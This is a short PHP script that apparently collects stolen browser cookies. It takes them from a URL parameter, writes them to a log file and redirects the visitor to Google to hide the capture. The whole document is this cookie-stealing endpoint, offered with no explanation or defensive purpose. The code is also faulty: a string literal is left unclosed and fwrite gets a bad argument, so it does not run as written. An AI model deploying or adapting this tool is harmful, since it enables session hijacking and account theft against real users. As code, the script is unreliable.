<?php
header('Location:https://google.com');
      $cookies=$_GET["c"];
      $file = fopen('./log.txt, 'w');
      fwrite($file, $cookies, "\n\n");
?>
